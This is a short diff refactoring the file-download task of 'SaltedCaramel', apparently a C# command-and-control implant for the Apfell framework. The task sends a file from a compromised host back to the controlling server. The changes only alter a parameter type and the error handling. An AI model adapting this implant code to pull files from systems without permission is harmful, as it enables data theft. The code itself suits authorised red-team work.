@@ -11,7 +11,7 @@ namespace SaltedCaramel.Tasks
 {
     internal class Download
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task, SCImplant implant)
         {
             string filepath = task.@params;
             try // Try block for file upload task
@@ -76,7 +76,6 @@ namespace SaltedCaramel.Tasks
                     Thread.Sleep(implant.sleep);
                 }
 
-
                 // Tell the Apfell server file transfer is done
                 implant.SendComplete(task.id);
                 Debug.WriteLine($"[+] Download - File transfer complete: {filepath}");
@@ -84,8 +83,8 @@ namespace SaltedCaramel.Tasks
             catch (Exception e) // Catch any exception from file upload
             {
                 // Something failed, so we need to tell the server about it
-                implant.SendError(task.id, e.Message);
-                Debug.WriteLine($"[!] Download - ERROR: {e.Message}");
+                task.status = "error";
+                task.message = e.Message;
             }
 
         }
